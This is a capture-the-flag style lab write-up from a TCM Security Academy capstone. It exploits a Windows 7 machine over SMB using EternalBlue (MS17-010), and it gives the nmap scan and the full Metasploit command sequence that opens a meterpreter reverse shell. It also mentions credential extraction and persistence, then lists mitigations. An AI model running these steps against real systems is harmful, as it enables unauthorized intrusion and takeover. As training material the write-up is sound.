# TCM Security Academy Capstone Lab: Blue (EternalBlue Exploit)

## Overview

This writeup covers the exploitation of a vulnerable SMB service in the "Blue" lab from TCM Security Academy capstone using the EternalBlue exploit. The attack involves enumerating the target using `nmap` and exploiting it using `Metasploit Framework`.

## Tools Used

- `nmap` (for enumeration)
- `Metasploit Framework` (for exploitation)

## Enumeration

To identify the vulnerable SMB service, an `nmap` scan was performed:

```bash
sudo nmap -T4 -A <TARGET-IP>
```

![2025-03-16_08-00](https://github.com/user-attachments/assets/a4f07f5f-3d6e-4bba-a340-f40e983af7c0)

This revealed that the target is running **Windows 7 Ultimate Service Pack 1** and has SMB (`port 445`) open.

Additionally, searching for known exploits for this version confirmed that it is vulnerable to **MS17-010 (EternalBlue):**

![2025-03-16_08-01](https://github.com/user-attachments/assets/157b6e80-f5fe-4790-8b26-9de9e929e066)

## Exploitation

Using Metasploit, the following steps were executed:

1. Launch Metasploit:
   ```bash
   msfconsole
   ```
2. Search for the EternalBlue exploit:
   ```bash
   search ms17-010
   ```
   ![2025-03-16_08-05](https://github.com/user-attachments/assets/30f4e4cb-3d78-42f8-99bc-39f1fe851f51)

3. Select the EternalBlue exploit:
   ```bash
   use exploit/windows/smb/ms17_010_eternalblue
   ```
4. Set the required options:
   ```bash
   set RHOSTS <TARGET-IP>
   set PAYLOAD windows/x64/meterpreter/reverse_tcp
   set LHOST <YOUR-IP>
   set LPORT 4444
   ```
   ![2025-03-16_08-08](https://github.com/user-attachments/assets/47abc61b-49e0-4a92-ae80-3bd95076ff95)

5. Launch the exploit:
   ```bash
   exploit
   ```
   ![2025-03-16_08-09](https://github.com/user-attachments/assets/3c1e2b1d-f7fe-46c6-bca0-3e1e02f5234f)

If successful, this grants a **Meterpreter session**, providing remote access to the target:

![2025-03-16_08-10](https://github.com/user-attachments/assets/695114f6-1600-48d1-8d41-00e83ea9a583)

## Post-Exploitation

Once access is gained, various post-exploitation techniques can be used, such as:

- Privilege escalation
- Extracting credentials
- Maintaining persistence

## Mitigation

To prevent exploitation, the following security measures should be implemented:

- Patch the system (apply MS17-010 update)
- Disable SMBv1
- Restrict access to SMB services

## Conclusion

This lab demonstrated how the EternalBlue exploit can be used to compromise a vulnerable SMB service, highlighting the importance of timely patching and proper system hardening.

